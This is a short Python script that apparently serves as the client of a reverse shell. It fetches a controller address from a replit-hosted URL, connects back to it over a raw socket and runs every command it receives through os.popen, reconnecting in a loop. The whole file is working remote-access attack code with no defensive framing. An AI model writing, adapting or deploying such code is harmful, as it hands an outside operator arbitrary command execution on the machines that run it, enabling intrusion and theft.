import requests
import socket
import time
import os

host_url = 'https://pynet.rxyzqc.repl.co/remote'

if os.name == 'nt':
    os.system("title Client")


def host_info():
    while True:
        try:
            response = requests.get(host_url)
            if response.status_code == 200:
                ip, port = response.text.strip().split(':')
                return ip, int(port)

        except requests.RequestException as e:
            print("Error:", e)

        time.sleep(5)


def conn():
    while True:
        try:
            ip, port = host_info()
            c = socket.socket()
            c.connect((ip, port))
            print(f"Connected to {ip}:{port}")
            revshell(c)

        except ConnectionError as e:
            print("Error:", e)

        time.sleep(5)


def revshell(c):
    while True:
        data = c.recv(1024).decode()

        if data != "ping":
            os.popen(data)


conn()
